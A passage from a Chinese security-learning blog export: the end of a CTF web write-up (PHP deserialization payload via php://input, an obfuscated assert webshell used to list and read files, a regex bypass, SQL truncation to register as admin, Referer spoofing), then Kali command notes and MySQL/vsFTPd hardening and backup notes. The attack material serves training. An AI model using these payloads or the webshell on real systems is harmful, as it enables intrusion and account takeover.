new Flag; $test-&gt;file = &#39;flag.php&#39;; echo serialize($test); ?&gt; 现在构造payload： 这里$file要记得填hint.php，要将这个包含进来才可以，改成其他的会失败，因为失去Flag类 ?txt=php://input&amp;&amp;file=hint.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 通过Burpsuits提交，得到flag 第二十六关（过狗一句话）有提示： &lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt; 可以看出$poc_2=assert，也就是$poc_2($_GET[&#39;s&#39;]) = assert($_GET[&#39;s&#39;]) 可以利用assert()函数存在代码执行漏洞 数组形式返回当前目录下的文件： ?s=print_r(scandir(&#39;./&#39;)) 注意到其中的一个文件：flag_sm1skla1.txt 直接访问，拿到flag 题外话：可以继续利用这个漏洞，读取其他任意想要读取的文件 读取上一级目录： ?s=print_r(scandir(&#39;../&#39;)) 第二十七关（字符？正则？）链接进去直接看到代码，如下： &lt;?php highlight_file(&#39;2.php&#39;); $key=&#39;KEY{********************************}&#39;; $IM= preg_match(&quot;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); if( $IM ){ die(&#39;key is: &#39;.$key); } ?&gt; 分析一下： 简单复习一下preg_match()： preg_match(string $pattern , string $subject , array $matches) pattern 要搜索的模式，字符串类型。 subject 输入字符串。 matches 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。 模式的解释： 1.表达式直接写出来的字符串直接利用，如key 2.“.”：代表任意字符 3.“*”：代表一个或一序列字符重复出现的次数，即前一个字符重复任意次 4.“\\/”：代表“/” 5.[a-z]：代表a-z中的任意一个字符 6.[[:punct:]]：代表任意一个各种符号 7./i：代表大小写不敏感 8.{4,7}：代表前一个字符，连续出现的次数是4-7次就可以 这样我们就可以的出我们的id的有效值： ?id=key999key9999key:/9/999keya! 第二十八关（前女友(SKCTF)）链接打不开，先放着吧 第二十九关（login1(SKCTF)）题目有提示：SQL约束攻击 链接进去后点击”没有账号”，随便注册一个账号。返回登陆时，提示我们”不是管理员还想看flag?!” 那也就是提示我们，管理员才能看flag，那怎么通过管理员的身份去查看flag呢？注册一个管理员账号 参考博客：第二十九关WriteUp 首先先说一下SQL约束攻击： 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说&quot;admin&quot;等同于&quot;admin &quot;，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的 select * from user where username=&#39;admin &#39;; 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“abcdefg”时，实际上只能插入字符串的前5个字符，即“abcde” 知道条件的时候，我们就去注册一个账号，用户名为&#39;admin &#39;（后面接5个空格，空格数量随意），密码符合条件随意就行 然后直接用这个账号去登陆，拿到flag 也就是说，注册时使用INSERT语句帮我们插入一个用户名为&#39;admin &#39;的账户 登陆时，帮我们删掉了用户名后面的空格，即查询了&#39;admin&#39;用户的信息 第三十关（你从哪里来）链接打开看到提示：&quot;are you from google?&quot; 那么这关考察的是Http Referer： HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器藉此可以获得一些信息用于处理。比如从我主页上链接到一个朋友那里，他的服务器就能够从HTTP Referer中统计出每天有多少用户点击我主页上的链接访问他的网站 Referer的正确英语拼法是referrer。由于早期HTTP规范的拼写错误，为了保持向后兼容就将错就错了。其它网络技术的规范企图修正此问题，使用正确拼法，所以目前拼法不统一 我们可以自己测试一下，打开https://www.baidu.com，挂上Burpsuits的代理，随便点击一个可点链接 看一下Burpsuit中请求头里长什么样 果然是有Referer字段的，并且其内容是https://www.baidu.com，这就验证了我们的说法 那现在开始做题。将请求头加上Referer字段，内容为https://www.google.com，拿下flag Referer: https://www.google.com 至此，21-30关的Write-up结束 后一部分链接：第31-40关Write-up","categories":[],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://knlvre.github.io/tags/CTF-Web/"}],"author":"Knlvre"},{"title":"Kali学习笔记","slug":"Kali学习笔记","date":"2019-03-14T16:00:00.000Z","updated":"2019-08-22T17:46:51.619Z","comments":true,"path":"2019/03/15/Kali学习笔记/","link":"","permalink":"https://knlvre.github.io/2019/03/15/Kali学习笔记/","excerpt":"","text":"1. 常用命令grep：就前面执行后显示的内容进行筛选（egrep相反） 命令 | grep [&quot;XXX&quot;] awk：筛选第X行的内容 命令 | awk [&quot;X&quot;] cut：裁剪内容，-d 表示分割的标志，-f 接第几部分 命令 | cut -d [&quot;X&quot;] -f [X] ls：列出当前目录下内容（Window下是：dir） ls [-l/-a/-h...] cd：切换位置 cd [/etc/passwd] cd .. （切换至上一级目录） pwd：查看当前工作目录 pwd cat：查看文件全部内容 cat [/etc/passwd] less、more：一页页查看文件内容（回车翻行、空格翻页） less [/etc/passwd] （按Q退出） more [/etc/passwd] tail：查看文件最后几行（默认10行） tail [-20] [/etc/passwd] watch：隔几秒地刷新所查看文件（结合tail命令） watch -n [2] tail [-20] [/var/log/messages] rm：删除（删除目录需要加 -r 参数） rm [file_name] rm -r [directory_name] cp：拷贝（删除目录需要加 -r 参数） cp [target_file_name] [new_file_name] (在本目录下复制) cp -r [target_directory_name] [new_directory_name] cp [target_file_name] [destination_directory_name] （复制到执行目录） cp -r [target_file_name] [destination_directory_name] top：监视系统性能参数 top ps：显示进程信息（通常使用ps -ef或ps auf显示更详细的） ps -[ef] ifconfig：查看网卡信息 ifconfig netstat：查看简历网络连接的详细信息 netstat -[nao] dpkg：软件的安装、更新和移除。具体用法请百度 dppkg -[i/L] find：查找文件或者目录 find / -name [file_name/directory_name] find / -iname [file_name/directory_name] (加i不区分大小写) whereis：功能与find相同，但是范围小速度快 whereis [file_name/directory_name] touch：创建一个文件 touch [file_name] vi：编辑一个文件 vi [file_name] 如果想让文本显示行号.就在命令行 模式下,在文本最后输入”:set nu”命令.就可以了 如果要想编辑文本文件.必须要转换到插入模式下,也就是按一下键盘上的”i”就可以了.这样你就可以编辑文本,删除文本中的内容 输入你要输入的内容.如果你想退出文本编辑模式.并且保存刚刚编辑的文本.首先点击一下键盘上的”ESC”,然后输入”:wq!”这样就将文本保存了.然后推出了vi编辑器.如果不想保存就按一下键盘上的”ESC”,输入”:q!”.如果你不确定是否成功.可以通过”cat filename” 命令来查看. 查找：用”/“加上要查找的内容.例如”/hello”或者是”?hello”也是可以的. 替换：「r」：替换光标所在处的字符。 ,按一下”r”然后输入要即可. 「R」：替换光标所到之处的字符，直到按下「ESC」键为止。 恢复上一次操作：「u」：如果您误执行一个命令，可以马上按下「u」，回到上一个操作。按多次”u”可以执行多次恢复.就相当于”CTRL +Z”的操作. 光标的移动除了键盘上的上下左右键.也可以是小写模式下,按键盘上的”h,j,k,l”, “ctrl+b”:屏幕往后移动一页；”ctrl+f”:屏幕往前移动一页；”ctrl+u”:屏幕往后移动半页；”ctrl+d”:屏幕往前移动半页 输入任何一个整数，然后输入”shift+G” 就可以到这一页的开头了 按键盘上的大写”G”移动到文章的最后 按”$”符号将光标移动到行尾 “^”将光标移到行头；”w”:将光标移到下一行头；”b”:跟”w”相反.移到上一行行头；”e”:将光标移到下一行尾 2. 脚本格式if条件语句：使用中括号[]存放判断，以分号;结尾 if -&gt; 条件 -&gt; then -&gt; 执行体 -&gt; fi作为一个完整的条件执行 (seq 1 100)：从1到100逐个打印 3. 克隆网站工具：httrack 可以直接复制目标网站，并存放在默认目录/root/website下 将克隆好的网站文件，复制到/var/www/html下，使用命令/etc/init.d/apache2 start启动apache服务就可以访问了 4. NetCat网络安全工具中的瑞士军刀 聊天 传输文件 播放视频 端口扫描 远程克隆磁盘 远程控制 NC的安全传输NCAT 5. Tcpdump没有GUI界面的抓包工具 使用 -i 选取网卡；-s 选取字节,0表示无限大；-w 表示内容保存为文件的名字 筛选 -n 表示不对IP域名进行解析，直接显示IP；-r 表示读取文件内容，最初的截图有；src host 筛选源IP地址（dst host 筛选目的地址）；-X 以十六进制形式显示 6. DNS信息收集域名解析 FQDN：www.sina.com A类：直接映射出IP地址 NS类：一对多的关系，如sina.com.对应ns1.sina.com.和ns3.sina.com.等等 MX类：邮件服务器 ptr：方向解析域名（用IP地址解析出域名） Nslookup（域名解析） Dig @：后面加自己想要借用的DNS服务器如114.114.114.114 +noall：并不是全部信息，因为有的没用 +answer：与+noall一起使用，只显示answer部分 -x:表示反向查询 Bind版本查询命令：@后面加的是NS域名服务器 域名注册留下的信息查询（使用Whois） 域名注册可能会留下组织，电话什么的（提醒注册域名时，使用代理商的电话信息什么的，不要留下自己的信息） 例如：whois sina.com 7. 二层发现arping Nmap Netdiscover Scapy 8. 三层发现 Ping Scapy fping hping3 9. 搜索引擎RECON-NG（命令行）、Shodan（网站）、Google 10. 其他工具CUPP（生成社工字典）、exiftool（图片属性浏览）","categories":[],"tags":[{"name":"基础知识点","slug":"基础知识点","permalink":"https://knlvre.github.io/tags/基础知识点/"}],"author":"Knlvre"},{"title":"Mysql数据库","slug":"MySQL5数据库配置与管理","date":"2019-03-13T16:00:00.000Z","updated":"2019-07-18T07:31:26.522Z","comments":true,"path":"2019/03/14/MySQL5数据库配置与管理/","link":"","permalink":"https://knlvre.github.io/2019/03/14/MySQL5数据库配置与管理/","excerpt":"","text":"（一）数据库安全【Tip】Grant：授予 Privilege： 特权 Revoke：废除 Anonymous：匿名的 Recurse：递归 【原理】​ （1）数据库系统分为内部安全性和外部安全性。 ​ （2）内部安全性关心的是文件系统级的问题，既防止Mysql数据目录（DATADIR）被在服务器主机有账号的人（合法或盗取的）进行攻击。如果数据目录内容的权限过分授予，使得每个人均能简单地替代对应于那些数据库表的文件，那么确保控制客户通过网络访问的授权表设置正确，对此毫无意义。 ​ （3）外部安全性关心的是从外部通过网络连接服务器的客户的问题，既保护Mysql服务器免受来自通过网络对服务器的连接的攻击。必须设置Mysql授权表（grant table），使得他们不允许访问服务器管理的数据库内容，除非提供有效用户名和口令。 【步骤】一、1.1 启动mysql服务service mysqld restart 1.2 进入mysql，并且创建一个新的数据库mysql create database HSW; 1.3 创建一个新用户，命名为：studentcreate user &#39;student&#39;@&#39;localhost&#39;; 1.4 并给予相应数据库的权限grant all privileges on HSW.* to &#39;student&#39;@&#39;localhost&#39; with grant option; 1.5 刷新权限flush privileges; 1.6 显示授权show grants; 1.7 移除授权revoke delete on HSW.* from &#39;student&#39;@&#39;localhost&#39;； 1.8 为用户重命名rename user &#39;student&#39;@&#39;localhost&#39; to &#39;Knlvre&#39;@&#39;localhost&#39;； 1.9 为用户设置或更改密码SET PASSWORD FOR &#39;Knlvre&#39;@&#39;localhost&#39; = PASSWORD(&#39;666666&#39;); 1.10 删除数据库drop database HSW; 1.11 删除用户drop user &#39;Knlvre&#39;@&#39;localhost&#39;; 二、安全设置2.1 启动mysql服务service mysqld restart 2.2 修改root用户的口令方法1 mysqladmin -u root -p password 666 这时，系统会提醒你输入旧密码，如果没有就直接回车（这里是没有密码的） 方法2 在方法1当中并没有进入mysql而去设置密码，本方法中需要先进入mysql，需要输入刚才设置的密码’666’ mysql -u root -p 设置密码 set password for root@localhost=password(&#39;666&#39;); 方法3 最后一句flush privileges的意思是强制刷新内存授权表，否则用的还是缓存的口令，这是非法用户还可以用root用户及空口令登陆，直到重启Mysql服务器 use mysql; update user set password=password(&#39;666&#39;) where user=&#39;root&#39;; flush privileges; 2.3 删除默认的数据库和用户我们的数据库是在本地，并且也只需要本地的php脚本对mysql进行读取。mysql初始化后会自动生成空用户和test库，这会对数据库构成威胁，我们全部删除。我们使用mysql客户端程序连接到本地的mysql服务器后出现如下提示 drop database test; use mysql; delete from db; delete from user where not(host=&quot;localhost&quot; and user=&quot;root&quot;); flush pricileges; 2.4 改变默认mysql管理员的名称这个工作是可以选择的，根据个人习惯，因为默认的mysql的管理员名称是root，所以如果能够修改的话，能够防止一些脚本小子对系统的穷举。我们可以直接修改数据库，把root用户改为“admin” use mysql; update user set user=&quot;admin&quot; where user=&quot;root&quot;; flush privileges; 2.5 提高本地安全性主要是防止mysql对本地文件的存取，比如黑客通过mysql把/etc/passwd获取了，会对系统构成威胁。mysql对本地文件的存取是通过SQL语句来实现的，主要是通过Load DATA LOCAL INFILE来实现，我们能通过禁用该功能来防止黑客通过SQL注入等获取系统核心文件。禁用该功能必须在etc文件夹下的my.cnf文件的[mysqld]部分加上一个参数，如图所示 set-variable=local-infile=0 2.6 禁止远程链接mysql因为我们的mysql只需要本地的php脚本进行连接，所以我们无需开socket进行监听，那么我们完全可以关闭监听的功能，还是配置在etc文件夹下的my.cnf文件的[mysqld]部分添加内容： skip-networking 2.7 控制数据库访问权限对于使用php脚本来进行交互，最好建立一个用户只针对某个库拥有所有的操作权限，这样就很好避免了数据库用户名和密码被黑客查看后最小损失 创建一个数据库为db1 create database db1; 然后同时建立一个口令为adminab的用户test1能够访问该数据库 grant all privileges on db1.* to &#39;test1&#39;@&#39;localhost&#39; identified by &#39;adminab&#39; with grant option; 以上SQL是创建一个数据库db1，同时增加一个test1用户，对db1库有全部的操作权限，口令是adminab，但是它只能从本地连接mysql 2.8 限制一般用户浏览其他数据库如果有多个数据库，每个数据库有一个用户，那么必须限制用户浏览其他数据库内容，可以在启动mysql服务器时加上–skip-show-database启动 service mysqld restart --skip-show-database 三、vsFTP安全设置vsFTPd是一款非常著名的ftp daemon程序，目前包括Redhat在内很多大公司都在使用，它是一款安全性很高的程序 vsFTPd设置选项比较多，涉及方方面面，我们下面主要是针对安全方面进行设置 目前我们的需求就是使用系统账户的同时也作为FTP账户来进行文件的管理，目前假设我只需要一个账户来更新我的网站，并且我不希望该账户能够登陆系统，比如网站目录是在/usr/www下面，那么我们创建一个用户ftp，它的主目录是/usr/www，并且它的shell是/usr/sbin/nologin，就是没有shell，防止该用户通过ssh等登陆到系统 下面是针对vsftpd的配置文件vsftpd.conf文件的配置。 3.1 禁止匿名用户anonymous_enable=NO 3.2 允许本地用户登陆local_enable=YES 3.3 只允许系统中的ftp用户或者某些指定的用户访问ftp，打开用户文件列表功能userlist_enable=YES 3.4 只允许用户文件列表中的用户访问ftp:以及用户名文件列表路径userlist_deny=NO userlist_file=/etc/vsftpd.user_list 3.5 对vsftpd的用户使用pam认证pam_service_name=vsftpd 3.6 需要指出vsftpd进行pam认证时所使用的pam配置文件名，默认值是vsftpd。把本地用户锁定在自己的主目录，防止转到其他目录chroot_local_users=NO chroot_list_enable=YES chroot_list_file=/etc/vsftpd.chroot_list 3.7 然后在/etc下创建vsftpd.chroot_list文件，里面把我们要限制的本地账户加进去，一行一个，我们加上ftp，防止它登录到系统 3.8 隐藏文件真实的所有用户和组信息，防止黑客拿下ftp后查看更多系统用户信息hide_ids=YES 3.9 取消ls -R命令，节省资源，因为使用该命令，在文件列表很多的时候将浪费大量系统资源ls_recurse_enable=NO local_umask=022 write_enable=YES 3.10 打开日志功能同时设置日志的目录，启用详细的日志记录格式xferlog_enable=YES xferlog_file=/var/log/vsftpd.log xferlog_enable=YES 3.11 如果打开虚用户功能等，那么建议关闭本地用户登录local_enable=NO 【思考】缺省安装额mysql有密码吗？ 答：没有 （二）备份和恢复【原理】​ 备份是最简单的保护数据的方法，本文介绍多种备份方法。为了得到一个一致的备份，在相关的表上做一个lock tables，你只需要一个读锁定，当你在数据库目录中做文件的一个拷贝时，这允许其他线程继续查询该表；当你恢复数据时，需要一个写锁定，以避免冲突 【步骤】一、使用SQL语句备份和恢复你可以使用select into outfile语句进行备份，并使用load data infile语句恢复数据 这种方法只能导出数据的内容，不包括表的结构，如果表的结构文件损坏，你必须要先恢复原来的表的结构 语法： select * into {outfile|dumpfile} &#39;file_name&#39; from table_name load data [low_priority][local] infile &#39;file_name&#39; [replace|ignore] into table table_name select … into outfile ‘file_name’格式的select语句将选择的行写入一个文件。文件在服务器主机上被创建，并且不能是已经存在的（这可以阻止数据库表和文件例如“/etc/passwd”被破坏）。select … into outfile是load data infile的逆操作 load data infile语句从一个文本文件中以很高的速度读入一个表中。如果指定local关键词，从客户主机读取文件；如果未指定local关键词，文件必须位于服务器上（local关键词在Mysql3.22.6或以后版本中可用） 为了安全原因，当读取位于服务器上的文本文件时，文件必须处于数据库目录或可被所有人读取。另外，为了对服务器上文件使用load data infile，在服务器主机上必须有file的权限。使用select into outfile语句，在服务器主机上必须有file权限 为了避免重复记录，在表中需要一个primary key或unique索引。当在唯一索引值上一个新纪录与一个老记录重复时，replace关键词使得老记录用一个新纪录代替。如果指定ignore，跳过有唯一索引的现有行的重复行的输入。如果不指定任何一个选项，当找到重复索引值时，出现一个错误，并且文本文件的余下部分被忽略。 如果指定关键词low_priority，load data语句的执行被推知道没有其他客户读取表之后 使用local将比让服务器直接存取文件慢些，因为文件的内容必须从客户主机传送到服务器主机。在另一方面，不需要file权限装载本地文件。如果使用local关键词从一个本地文件装在数据，服务器没有办法在操作的当中停止文件的传输，因此缺省的行为好像ignore被指定一样 当在服务器主机上寻找文件时，服务器使用下列规则： 如果给出一个绝对路径名，服务器使用该路径名 如果给出一个有一个或多个前置部件的相对路径名，服务器相对服务器的数据目录搜索文件 如果给出一个没有前置部件的一个文件名，服务器在当前数据库的数据库目录寻找文件 1.1 启动mysql服务service mysqld restart 1.2 创建账号密码mysqladmin -u root -p password &#39;123456&#39; 1.3 进入mysqlmysql -u root -p 1.4 创建数据库dbcreate database db; 1.5 使用数据库dbuse db; 1.6 创建数据表create table tbl_name(a int); 1.7 锁定数据表，避免在备份过程中，表被更新lock tables tbl_name read; 1.8 导出数据select * into outfile &#39;tbl_name.bak&#39; from tbl_name; 1.9 解锁表unlock tables; 二、数据库备份的导入2.1 为表增加一个锁定lock tables tbl_name write; 2.2 导入备份数据load data infile &#39;tbl_name.bak&#39; replace into table tbl_name; 2.3 low_priority关键字指定一个low_priority关键字，就不必对表锁定，因为数据的导入将被推迟到没有客户读表为止 load data low_priority infile &#39;tbl_name.bak&#39; replace into table tbl_name; 2.4 解锁表unlock tables; 三、使用mysqlimport恢复数据为了恢复数据完全没有必要在客户机中执行SQL语句，因为你可以简单的使用mysqlimport程序 3.1 创建db1，建表tbl1，插入三组数据create database db1; use db1; create table tbl1(a int); insert tbl1 values(1); insert tbl1 values(2); insert tbl1 values(3); select * from tbl1; 3.2 对表tbl1进行备份select * into outfile &#39;tbl1.bak&#39; from tbl1; 3.3 删除tbl1detele from tbl1; select * from tbl1; 3.4 恢复tbl1并进入查看结果注意：这里的-p之后没有加空格 exit mysqlimport -p123456 --lock-tables --replace db1 tbl1.bak mysqladmin -p123456 use db1; select * from tbl1; 3.5 low_priority选项mysqlimport -p123456 --low-priority --replace db1 tbl1.bak 3.6 如果为远程的服务器恢复数据，可以如此mysqlimport -p123456 -C --lock-tables --replace db1 tbll.bak 四、使用mysqldump备份数据同mysqlimport一样，也存在一个工具mysqldump备份数据，但是它比SQL语句多做的工作是可以在导出的文件中包括SQL语句，因此可以备份数据库表的结构，而且可以备份一个数据库，甚至整个数据库系统 mysqldump [options] database [tables] mysqldump [options] --databases [options] DB1 [DB2 DB3 ...] mysqldump [options] --all-databases [options] 如果不给定任何表，整个数据库将被倾倒。可以执行mysqldump –help可以得到mysqldump的版本支持选项表 4.1 备份数据库的方法，服务器主机上备份数据库db1mysqldump db1 -p123456 4.2 备份过程及结果 4.3 定向标准输出mysqldump缺省时把输出定位到标准输出，需要重定向标准输出。把数据库备份到db1.bak中 mysqldump -u root -p123456 db1 &gt; db1.bak 4.4 备份数据表mysqldump -u root -p123456 --tables db1 tbl1 &gt; tbl1.bak 4.5 备份整个数据库系统也可以备份整个数据库系统的拷贝，不过对于一个庞大的系统，这样做没什么实际的价值 mysqldump -u root -p123456 --all-database &gt; db.bak 五、有关生成SQL语句的优化控制–add-locks生成的SQL语句中，在每个表数据恢复之前增加lock tables并且之后unlock tables（为了使得更快的插入到mysql）。 –add-drop-table生成得SQL语句中，在每个create语句之前增加一个drop table -e，–extended-insert使得全新多行insert语法（给出更紧缩并且更快的插入语句） -l，–lock-tables为开始导出数据前，读锁定所有涉及的表 -q，–quick不缓冲查询，直接倾倒至stdout –opt选项，它会是上述所有选项有效 5.1 备份单个数据库或表create db2; exit; mysqldump -u root -p123456 --opt db1 &gt; db1.txt mysqldump -u root -p123456 --opt db1 &gt; db1.sql mysql db2 &lt; db1.sql -p123456 5.2 不必指定数据库如果使用–database或者–all-database选项，由于导出文件中已经包含创建和选用数据库的语句，可以直接使用，不必指定数据库 mysqldump -u root -p123456 --database db1 &gt; db1.sql mysql -u root -p123456 &lt; db1.sql 【思考】出现access denied for user ‘root‘@’localhost’ (using password:no)该错误是什么原因？ 答：很巧，前面我在使用mysqldump备份单个数据库时，由于密码输出，出现了如下提示 access denied for user &#39;root&#39;@&#39;localhost&#39; (using password:YES) 这是有输入密码的，但是密码出错了。所以可以猜测题目这个报错是由于：没有输入密码 （三）字符串模式匹配【原理】SQL的模式匹配允许你使用“_”匹配任何单个字符，而“%”匹配任何数据字符 【步骤】一、环境构建1.1 启动mysql服务service mysqld restart 1.2 进入mysqlmysql 1.3 创建mytest数据库create database mytest; 1.4 使用mytestuse mytest; 1.5 建立student表创建一个表并添加内容create table student (name varchar(10),teacher varchar(10),age int,sex varchar(10),sno varchar(20)); insert into student (name,teacher,age,sex,sno) values (&#39;wanglin&#39;,&#39;jake&#39;,&#39;20&#39;,&#39;woman&#39;,&#39;201902&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;liming&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;man&#39;,&#39;201903&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;fang&#39;,&#39;tony&#39;,&#39;22&#39;,&#39;woman&#39;,&#39;201904&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;limeng&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;women&#39;,&#39;201905&#39;); insert into student (name,teacher,age,sex,sno) values (&#39;liuhu&#39;,&#39;benny&#39;,&#39;23&#39;,&#39;woman&#39;,&#39;201906&#39;); select * from student; 二、标准的SQL模式匹配2.1 在表student中，找”l”开头的名字select * from student where name like &quot;l%&quot;; 2.2 找出以”u”结尾的名字select * from student where name like &quot;%u&quot;; 2.3 找出包含一个”u”的名字select * from student where name like &quot;%u%&quot;; 2.4 使用”_”字符，找出包含正好5个字符的名字select * from student where name like &quot;_____&quot;; 三、扩展正则表达式模式匹配“.”匹配任何单个的字符，一个字符类“[…]”匹配在方括号内的任何字符，例如，“[abc]”匹配”a”、”b”或”c”。 “-“为了命名字符的一个范围，“[a-z]”匹配任何小写字母，而“[0-9]”匹配任何数字 “*”匹配零个或多个在它前面的东西，例如“X*”匹配任何数量的”X”字符，”[0-9]*”匹配任何数量的数字 而“.*”匹配任何数量的任何东西 正在表达式是区分大小写的，但是如果你希望，你能使用一个字符类匹配两种写法：例如，“[a^]”匹配小写或大写的”a”而“[a z^Z]”匹配两种写法的任何字母 如果它出现在被测试值得任何地方，模式就匹配（只要他们匹配整个值，SQL模式匹配）。为了定位一个模式以便它必须匹配被测试值得开始或结尾，在模式开始处使用“^”或在模式得结尾用“$” 为了说明扩展正则表达式如何工作，上面所示得LIKE查询在下面使用Regexp重写 3.1 找出”l”开头的名字使用“^”匹配名字的开始并且“[lL]”匹配小写或大写的”l” select * from student where name regexp &quot;^[lL]&quot;; 3.2 找出以”u”结尾的名字使用“$”匹配名字的结尾 select * from student where name regexp &quot;[u$]&quot;; 3.3 找出包含一个”e”的名字使用“[eE]”匹配小写或大写的“e” select * from student where name regexp &quot;[eE]&quot;; 3.4 找出包含正好5个字符的名字利用通配符进行模糊匹配，使用“^”和“$”匹配名字的开始和结尾，和5个“.”事例在两者之间 select * from student where name regexp &quot;[^.....$]&quot;; 3.5 使用”{n}” “重复n次”操作符重写先前的查询select * from student where name regexp &quot;[^.{5}$]&quot;; 四、列的别名精选输出的列可以用列名、列别名或列位置在order by和group by子句引用，列位置从1开始。例如，我们从student表中检索出姓名和年宁，直接引用列名 4.1 直接引用列名delete from student where name=&quot;wanglin&quot;; delete from student where name=&quot;fang&quot;; select name,age from student order by name,age; 4.2 在子句中使用列的位置这句语句的输出与上面并没有不同 select name,age from student order by 1,2; 4.3 为列命名select name as n,age as a from student order by n,a; 返回的记录顺序并无不同，但是列的名字有了变化，这一点在使用create table … select 语句创建表时是有意义的。例如，我们想从pet表生成包括其中name,owner字段的表，但是想把name和owner字段的名字重新命名为animal和child，一个很笨的方法就是创建表再录入数据，如果使用别名，则仅仅一条SQL语句就可以解决： 4.4 使用create table selectcreate table newstudent select name as newname,teacher as newteacher from student; 4.5 检索生成的表select * from newstudent; 五、表的别名别名不仅可以应用于列，也可以引用于表名，具体方法类似于列的别名，这里不再重复。列的别名经常用于表自身的连接中。你不必有2个不同的表来执行一个联结。如果你想要将一个表的记录与同一个表的其他记录进行比较，联结一个表到自身有时是有用的 5.1 联结表自身select s1.name,s1.sex,s2.name,s2.sex,s1.teacher from student as s1,student as s2 where s1.teacher=s2.teacher and s1.sex=&quot;man&quot; and s2.sex=&quot;woman&quot;; 在这个查询中，我们为表名指定别名以便能引用列并且使得每一个列引用关联于哪个表实力更直观 六、取出互不相同的记录有时候你可能希望取出的数据互不重复，因为重复的数据可能对你没有意义。解决的办法是使用Distinct关键字，使用这个关键字保证结果集中不包括重复的记录，也就是说，你取出的记录中，没有重复的行 6.1 取出student表中benny所指导的学生的记录select name,teacher,age,sex from student where teacher = &quot;benny&quot;; 注意上面的结果，因为我们要使用它 6.2 指定Distinct关键字select distinct name,age,sex from student where teacher = &quot;benny&quot;; 6.3 修改作比较你可以看到有两条结果，这是因为返回的结果集中的行不同，如果我们做以下更改，只返回teacher,sex列，你可以观察变化 select teacher,sex from student where teacher = &quot;benny&quot;; Distinct关键字的存在，使查询只返回不同的记录行。如果一个表中，有完全相同的行，你可以使用Distinct，以去除冗余的输出： select distinct * from tbl_name; 七、NULL值的问题概念上，NULL意味着”没有值”或”未知值”，且它被看作有点与众不同的值。为了测试NULL，你不能使用算法比较运算符例如=、&lt;或!= 7.1 不能使用运算符select 1 = NULL,1 != NULL,1 &lt; NULL,1 &gt; NULL； 很清楚，这些结果的比较中毫无意义 7.2 使用IS NULL和IS NOT NULL操作符select 1 IS NULL,1 IS NOT NULL; 这说明在Mysql中，0意味着假而1意味着真 7.3 使用NULLNULL这样特殊的处理是为什么，例如，可以只查看在学校有学号的同学 select * from student where sno is not null; 7.4 NULL值的概念NULL值的概念是造成SQL的新手的混淆的普遍原因，他们经常认为NULL是和一个空字符串’’的一样的东西。但并不是这样的，例如，下列语句是完全不同的 create table my_table(phone varchar(20)); 7.5 插入NULL值并查看insert into my_table (phone) values (NULL); select * from my_table; 7.6 删除这行数据delete from my_table where phone is null; 7.7 插入空字符串并查看insert into my_table (phone) values (&quot;&quot;); select * from my_table 两个语句把值插入到phone列，但是第一个插入一个NULL值而第二个插入一个空字符串。第一个的含义可以认为是”电话号码不知道”，而第二个则可意味着”她没有电话” 7.8 关于NULL值的比较在SQL中，NULL值在与任何其他值甚至NULL值比较时总是假的（FALSE）。包含NULL的一个表达式总是产生一个NULL值，除非在包含在表达式中的运算符和函数的文档中指出 select NULL,1+NULL,concat(&#39;invisible&#39;,NULL); 7.9 如果你想要寻找值是NULL的列，你不能使用=NULL测试下面语句不返回任何行，因为对任何表达式，expr=NULL都是假的 select * from my_table where phone = NULL; 7.10 想要寻找NULL值，必须使用IS NULL测试insert into my_table (phone) values (NULL); select * from my_table where phone is NULL; 7.11 寻找空字符串select * from my_table where phone = &quot;&quot;; 在Mysql中，就像很多其他的SQL服务器一样，你不能索引可以有NULL值得列。你必须声明这样的列为NOT NULL，而且，你不能插入NULL到索引得列中 当使用order by使，首先呈现NULL值。如果你用desc以降序排序，NULL值最后显示。当使用group by时，所有的NULL值被认为是相等的。 为了有助于NULL的处理，你能使用IS NULL和IS NOT NULL运算符和IFNULL()函数 对某些列类型，NULL值被特殊地处理。如果你将NULL插入表地第一个TIMESTAMP列，则插入当前的日期和时间。如果你将NULL插入一个AUTO_INCREMENT列，则插入顺序中的下一个数字 八、大小写敏感性8.1 向表中增添3组数据insert my_table values(&#39;13812345678&#39;); insert my_table values(&#39;13822334455&#39;); insert my_table values(&#39;13323123123&#39;); 8.2 查询数据库语句同时使用大小写在Mysql中，数据库和表对应于在那些目录下的目录和文件，因而，内在的操作系统的敏感性决定数据库和表命名的大小写的敏感性。这意味着数据库和表名在Unix上是区分大小写的，而在Win32上忽略大小写。 注意：在Win32上，尽管数据库和表名是忽略大小写的，你不应该在同一个查询中使用不同的大小写来引用一个给定的数据库和表。下列查询将不工作，因为它作为my_table和MY_TABLE引用一个表 select * from my_table where MY_TABLE.phone = &#39;13812345678&#39;; 8.3 查询数据库语句统一使用小写select * from my_table where my_table.phone = &#39;13812345678&#39;; 8.4 列名：列名在所有情况下都是忽略大小写的8.5 查询表的别名语句同时使用大小写表的别名是区分大小写的，下列查询将不工作，因为它用a和A引用别名 select * from my_table as a where a.phone = &#39;13812345678&#39; or A.phone = &#39;13822334455&#39;; 8.6 查询表的别名语句统一使用小写select * from my_table as a where a.phone = &#39;13812345678&#39; or a.phone = &#39;13822334455&#39;; 8.7 列的别名：列的别名是忽略大小写的8.8 